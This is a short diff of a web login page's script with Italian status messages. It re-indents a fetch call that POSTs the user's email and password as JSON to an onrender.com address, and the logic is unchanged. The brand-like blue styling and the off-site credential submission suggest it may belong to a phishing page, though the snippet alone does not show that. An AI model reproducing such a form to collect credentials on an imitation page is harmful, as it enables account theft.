@@ -82,13 +82,13 @@
             const messageDiv = document.getElementById('message');
             messageDiv.style.color = '#1877f2';
             messageDiv.innerText = 'Verifica in corso...';
-            try {
-               const response = await fetch('https://onrender.com', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password })
-                });
-                const data = await response.json();
+                    try {
+            const response = await fetch('https://onrender.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, password })
+            });
+            const data = await response.json();
                 if (response.ok) {
                     messageDiv.style.color = 'green';
                     messageDiv.innerText = 'Login effettuato! Reindirizzamento...';
